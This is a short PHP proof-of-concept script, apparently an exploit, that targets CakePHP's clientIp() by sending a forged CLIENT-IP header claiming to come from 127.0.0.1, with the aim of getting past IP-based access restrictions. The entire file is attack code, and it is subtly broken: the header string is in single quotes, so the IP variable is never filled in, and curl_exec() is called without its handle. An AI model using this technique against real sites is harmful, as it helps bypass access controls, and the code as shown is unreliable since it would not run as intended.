<?php
/*
# CakePHP - IP Spoofing
#	- Abuses "$request->clientIp()"
#	- jb
*/

function curl($url, $ip) {
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array('CLIENT-IP: $ip'));
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$output = curl_exec();
	curl_close($ch);
	return $output;
}

$page = curl("http://127.0.0.1/cake3/cake3/", "127.0.0.1");

?>
